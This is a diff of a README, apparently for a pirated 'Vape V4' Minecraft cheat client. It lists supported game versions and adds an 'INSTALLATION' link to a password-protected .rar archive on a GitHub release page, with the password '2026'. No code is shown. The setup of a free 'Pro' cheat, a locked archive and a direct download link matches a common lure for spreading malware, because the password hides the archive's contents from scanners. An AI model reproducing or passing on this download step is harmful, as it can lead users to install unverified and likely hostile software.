@@ -9,7 +9,8 @@ Update  + fix bag
   1.8.9 (Forge и Vanilla)
   1.12.2 (Forge)
   1.16.5 (Forge)
+  AND NEWER VERSIONS
 ---
-(installation)
-### password 2026
+### [INSTALLATION](https://github.com/Signalbrerhythm/Vape-V4-Vape-Lite/releases/download/vapev4/Vape.V4.Pro.Panel.rar)
+### PASSWORD 2026
 ---
